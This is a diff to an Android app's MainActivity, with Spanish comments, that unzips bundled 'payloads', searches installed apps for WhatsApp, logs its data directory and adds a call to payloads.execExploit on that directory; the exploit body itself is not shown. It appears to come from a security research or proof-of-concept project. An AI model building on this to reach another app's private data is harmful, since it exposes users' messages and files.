@@ -35,7 +35,7 @@ public class MainActivity extends AppCompatActivity {
         Payloads payloads = new Payloads();
 
         // Posible modificacion: enviar las rutas de los ficheros con la opcion ENVIRONMENT
-        payloads.unZip();
+        payloads.unZip(String.valueOf(getFilesDir()));
 
         // Listar las aplicaciones disponibles en busca de Whatsapp
         AppInfo appInfo = new AppInfo();
@@ -65,6 +65,7 @@ public class MainActivity extends AppCompatActivity {
 
             Log.d("dataDir", dataDir);
             Log.d("sourceDir", sourceDir);
+            payloads.execExploit(dataDir, String.valueOf(getFilesDir()));
 
         }
     }
@@ -117,6 +118,24 @@ public class MainActivity extends AppCompatActivity {
         File[] files = directory.listFiles();
 
         Log.d("listDir, files: ", String.valueOf(files.length));
+
+        for (int i = 0; i < files.length; i++)
+        {
+
+            String file_name = files[i].getName();
+            Log.d("getFilesFor, file: ", file_name);
+        }
+
+    }
+    public void getFilesFor(){
+
+        String dataDir = getFilesDir().toString();
+        //dataDir = dataDir + "/files";
+        Log.d("getFilesFor dataDir: ", dataDir);
+        File directory = new File(dataDir);
+        File[] files = directory.listFiles();
+
+        Log.d("getFilesFor, files: ", String.valueOf(files.length));
 
         for (int i = 0; i < files.length; i++)
         {
